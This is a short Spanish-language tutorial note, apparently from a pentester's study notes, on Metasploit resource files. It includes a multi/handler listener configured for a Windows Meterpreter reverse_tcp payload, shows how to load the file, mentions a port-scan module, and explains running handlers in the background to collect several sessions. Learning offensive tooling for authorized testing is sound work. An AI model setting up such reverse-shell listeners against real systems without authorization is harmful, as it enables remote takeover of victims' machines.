```
/usr/share/metasploit-framework/scripts/resource
```

Creamos un fichero handler.rc y e agregamos los comandos que qeremos ejecutar
```
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

Para cargarlo en MSF
```
msfconsole -r handler.rc
```

Creamos otro para hacer un scaneo de puertos  porscan.rc

use auxiliary/scanner/portscan/tcp

Forma simulada
Puedes usar **variables de entorno de tu sistema** y luego insertarlas en el `.rc`.
```
export LHOSTIP=192.168.1.55
export LPORTNUM=5555
```

listener.rc
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOSTIP
set LPORT $LPORTNUM
exploit -j -z   #Podemos utilizar run

**`-j`** → **Job**  
Le dice a Metasploit que ejecute el módulo en **segundo plano** como un _job_, para que puedas seguir usando la consola mientras espera conexiones.

**`-z`** → **Don’t interact**  
Cuando llega una sesión (por ejemplo, un Meterpreter), **no cambia automáticamente** a esa sesión, sino que la deja abierta en segundo plano.  
Esto es útil si esperas múltiples sesiones o si quieres seguir lanzando más ataques sin que te saque del flujo actual.
```


Ejecutar los scripts creados estando dentro de la consola de msf
```
msf6>resource /dir/handler.rc
```
